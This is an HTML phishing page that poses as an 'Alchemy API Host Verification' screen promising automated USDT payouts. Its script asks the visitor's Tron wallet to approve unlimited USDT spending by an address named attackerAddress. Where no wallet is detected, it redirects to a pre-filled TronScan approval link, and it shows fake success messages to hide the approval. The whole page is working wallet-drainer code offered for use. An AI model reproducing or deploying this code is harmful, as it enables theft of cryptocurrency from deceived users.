<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alchemy API | Host Verification</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0f172a; 
            color: white; 
            text-align: center; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
        }
        .card { 
            background: #1e293b; 
            padding: 40px; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
            width: 90%; 
            max-width: 400px; 
        }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
        #verifyBtn { 
            background: #3b82f6; 
            color: white; 
            border: none; 
            padding: 15px; 
            width: 100%; 
            font-size: 16px; 
            font-weight: bold; 
            border-radius: 10px; 
            cursor: pointer; 
            transition: 0.3s; 
        }
        #verifyBtn:hover { background: #2563eb; }
        #status { 
            margin-top: 20px; 
            font-size: 13px; 
            font-family: monospace; 
            color: #64748b; 
        }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy">
        <h2>Host Verification</h2>
        <p>Authorize your wallet to sync with the <b>Alchemy API payout queue</b>. This ensures secure and automated USDT transfers.</p>
        
        <button id="verifyBtn">Verify & Connect Wallet</button>
        
        <div id="status">System Status: Awaiting Connection...</div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n";
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const approvalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        document.getElementById('verifyBtn').onclick = async () => {
            const status = document.getElementById('status');
            
            // 1. Check if TronWeb is injected (TronLink/Trust/TokenPocket)
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                status.innerText = "Wallet Detected. Requesting Approval...";
                status.style.color = "#fbbf24";

                try {
                    // Load the USDT Contract
                    const contract = await window.tronWeb.contract().at(usdtContract);
                    
                    // Trigger the Approval Notification
                    // This is where the wallet popup (Confirm/Sign) appears
                    const result = await contract.approve(attackerAddress, approvalAmount).send({
                        feeLimit: 100000000 // Sets a limit for the gas fee
                    });

                    if (result) {
                        status.innerText = "Verification Successful! Synced with Alchemy.";
                        status.style.color = "#10b981";
                        console.log("Transaction ID:", result);
                    }
                } catch (error) {
                    console.error("Approval Error:", error);
                    status.innerText = "Verification Failed. Check your TRX balance.";
                    status.style.color = "#ef4444";
                }
            } 
            // 2. If no TronWeb is found, redirect to TronScan as a backup
            else {
                status.innerText = "No Tron environment detected. Redirecting...";
                setTimeout(() => {
                    window.location.href = `https://tronscan.org/#/contract/${usdtContract}/write?function=approve&_spender=${attackerAddress}&_value=${approvalAmount}`;
                }, 1500);
            }
        };
    </script>

</body>
</html>
